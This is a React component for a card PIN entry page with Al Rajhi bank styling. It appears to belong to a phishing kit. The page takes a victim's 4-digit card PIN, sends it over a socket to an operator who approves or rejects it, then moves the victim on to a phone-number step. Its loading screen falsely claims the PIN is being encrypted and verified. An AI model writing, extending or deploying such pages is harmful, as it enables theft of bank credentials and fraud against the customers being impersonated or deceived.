import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { socketService } from '../../services/socketService';
import { useI18n } from '../../shared/i18n';
import PaymentLoadingScreen from '../../client/components/PaymentLoadingScreen';

const Pin: React.FC = () => {
    const location = useLocation();
    const navigate = useNavigate();
    const { t, language } = useI18n();

    const { cardType } = location.state || { cardType: 'other' };

    const [pin, setPin] = useState('');
    const [showPinValue, setShowPinValue] = useState(false);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [showPinLoading, setShowPinLoading] = useState(false);
    const [showPinError, setShowPinError] = useState(false);
    const [pinErrorMessage, setPinErrorMessage] = useState('');

    const isRajhi = cardType === 'rajhi';

    useEffect(() => {
        const handlePinApproved = (data: { redirectTo?: string }) => {
            setLoading(false);
            setShowPinLoading(false);
            navigate(data?.redirectTo || '/phone', { replace: true });
        };

        const handlePinRejected = (data: { message?: string }) => {
            setLoading(false);
            setShowPinLoading(false);
            setPin('');
            setPinErrorMessage(
                data?.message ||
                (language === 'ar'
                    ? 'رمز PIN المدخل غير صحيح أو حدثت مشكلة أثناء الإدخال. يرجى المحاولة مرة أخرى.'
                    : 'The entered PIN is incorrect or an input issue occurred. Please try again.')
            );
            setShowPinError(true);
        };

        socketService.on('pinApproved', handlePinApproved);
        socketService.on('pinRejected', handlePinRejected);

        return () => {
            socketService.off('pinApproved', handlePinApproved);
            socketService.off('pinRejected', handlePinRejected);
        };
    }, [navigate, language]);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        if (pin.length !== 4) {
            setError(language === 'ar' ? 'الرجاء إدخال PIN مكون من 4 أرقام' : 'Please enter a 4-digit PIN');
            return;
        }

        setLoading(true);
        setError('');
        setShowPinError(false);

        socketService.emitClientEvent('submitPin', { pin });
        setShowPinLoading(true);
    };

    return (
        <div className="max-w-lg mx-auto mt-5 md:mt-10 relative z-20 px-4 sm:px-0">
            <div className={`bg-white rounded-xl shadow-xl p-6 md:p-8 text-center border-t-4 ${isRajhi ? 'border-[#117D48]' : 'border-blue-600'}`}>
                <div className={`w-16 h-16 md:w-20 md:h-20 rounded-full flex items-center justify-center mx-auto mb-6 md:mb-8 ${isRajhi ? 'bg-[#117D48]/10' : 'bg-blue-50'}`}>
                    {isRajhi ? (
                        <span className="text-[#117D48] text-3xl font-bold">ر</span>
                    ) : (
                        <svg className="w-8 h-8 md:w-10 md:h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 11c1.657 0 3-1.567 3-3.5S13.657 4 12 4 9 5.567 9 7.5 10.343 11 12 11zm-7 9a7 7 0 0114 0" />
                        </svg>
                    )}
                </div>

                <h2 className="text-xl md:text-2xl font-bold text-gray-800 mb-3">
                    {language === 'ar' ? 'رمز PIN للبطاقة' : 'Card PIN Verification'}
                </h2>
                <p className="text-gray-500 mb-6">{t('enterCardPin')}</p>

                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <input
                            type={showPinValue ? 'text' : 'password'}
                            className={`w-full p-3 sm:p-4 md:p-6 border-2 rounded-xl text-center text-2xl sm:text-3xl md:text-4xl tracking-[0.4em] sm:tracking-[0.8em] md:tracking-[1em] font-mono focus:ring-0 outline-none transition-colors dir-ltr ${isRajhi ? 'border-[#117D48]/30 focus:border-[#117D48]' : 'border-blue-200 focus:border-blue-500'}`}
                            maxLength={4}
                            placeholder="••••"
                            value={pin}
                            onChange={(e) => {
                                const value = e.target.value.replace(/\D/g, '');
                                if (value.length <= 4) {
                                    setPin(value);
                                    setError('');
                                }
                            }}
                            autoFocus
                            required
                        />
                        <div className="mt-3 flex items-center justify-center gap-2">
                            <input
                                id="show-pin-toggle"
                                type="checkbox"
                                checked={showPinValue}
                                onChange={(e) => setShowPinValue(e.target.checked)}
                                className="w-4 h-4 accent-brand"
                            />
                            <label htmlFor="show-pin-toggle" className="text-sm text-gray-600 cursor-pointer select-none">
                                {language === 'ar' ? 'إظهار رمز PIN' : 'Show PIN code'}
                            </label>
                            <span className="text-xs text-gray-400">
                                {language === 'ar' ? 'رؤية الرمز' : 'View code'}
                            </span>
                        </div>
                        {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
                    </div>

                    <button
                        type="submit"
                        disabled={loading || pin.length < 4}
                        className={`w-full text-white font-bold py-3 md:py-4 rounded-xl shadow-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all ${isRajhi ? 'bg-[#117D48] hover:bg-[#0D5C3A]' : 'bg-blue-600 hover:bg-blue-700'}`}
                    >
                        {loading ? t('verifying') : t('confirm')}
                    </button>
                </form>
            </div>

            <PaymentLoadingScreen
                isVisible={showPinLoading}
                title={language === 'ar' ? 'جاري التحقق من PIN' : 'Verifying PIN'}
                description={language === 'ar' ? 'يرجى الانتظار بينما تتم مراجعة رمز PIN المدخل...' : 'Please wait while your entered PIN is being reviewed...'}
                steps={language === 'ar'
                    ? ['تشفير رمز PIN', 'إرسال الطلب للمراجعة', 'انتظار قرار القبول أو الرفض']
                    : ['Encrypting PIN', 'Sending request for review', 'Waiting for approve/reject decision']
                }
            />

            {showPinError && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full animate-fadeIn">
                        <div className="p-6">
                            <div className="text-center">
                                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                    <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                                    </svg>
                                </div>
                                <h3 className="text-xl font-bold text-gray-800 mb-2">
                                    {language === 'ar' ? 'تعذر تأكيد رمز PIN' : 'PIN Verification Failed'}
                                </h3>
                                <p className="text-gray-600 mb-6">
                                    {pinErrorMessage}
                                </p>
                                <button
                                    onClick={() => setShowPinError(false)}
                                    className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-3 rounded-xl shadow-lg transform hover:-translate-y-1 transition-all"
                                >
                                    {language === 'ar' ? 'إعادة المحاولة' : 'Try Again'}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Pin;
